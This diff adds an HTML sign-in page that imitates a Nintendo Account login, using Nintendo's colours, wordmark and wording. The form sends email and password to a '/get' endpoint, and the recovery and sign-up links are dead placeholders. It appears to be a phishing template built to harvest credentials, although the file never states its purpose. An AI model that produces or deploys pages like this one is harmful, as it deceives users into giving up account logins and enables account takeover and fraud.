@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Nintendo Account</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
+        background-color: #e60012;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 380px;
+        background: #fff;
+        border-radius: 20px;
+        padding: 40px 32px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 24px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #333;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 24px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: #f7f7f7;
+      }
+      .g-input:focus {
+        border-color: #e60012;
+        background: #fff;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #e60012;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #c50010;
+      }
+      .forgot {
+        display: block;
+        margin-top: 16px;
+        color: #333;
+        font-size: 13px;
+        text-decoration: none;
+      }
+      .forgot:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 24px;
+        font-size: 13px;
+        color: #666;
+      }
+      .footer a {
+        color: #e60012;
+        text-decoration: none;
+        font-weight: 600;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 100 28" width="100" height="28">
+        <text x="50%" y="22" text-anchor="middle" font-family="Arial" font-weight="900" font-size="22" fill="#e60012" letter-spacing="3">NINTENDO</text>
+      </svg>
+      <h1 class="g-h1">Sign In</h1>
+      <p class="g-h2">Sign in with your Nintendo Account</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="email" name="email" placeholder="Email address" required>
+        <input class="g-input" type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="gbtn-primary">Sign In</button>
+      </form>
+      <a href="#" class="forgot">Forgot your password?</a>
+      <p class="footer">Don't have an account? <a href="#">Create a Nintendo Account</a></p>
+    </div>
+  </body>
+</html>
